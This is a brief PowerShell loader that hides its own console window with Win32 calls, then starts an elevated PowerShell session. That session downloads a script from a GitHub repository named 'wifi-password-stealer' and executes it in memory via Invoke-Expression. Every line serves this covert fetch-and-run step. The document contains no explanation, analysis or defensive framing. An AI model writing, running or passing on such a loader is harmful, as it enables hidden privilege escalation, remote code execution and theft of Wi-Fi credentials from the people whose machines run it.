$host.UI.RawUI.WindowTitle = "Starting MysticHero..."
Add-Type -Name Window -Namespace Console -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
[void][Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)
Start-Process powershell -ArgumentList "(Invoke-WebRequest -UseBasicParsing https://raw.githubusercontent.com/mystichero1/wifi-password-stealer/refs/heads/main/MysticHero.ps1).Content | Invoke-Expression" -Verb RunAs
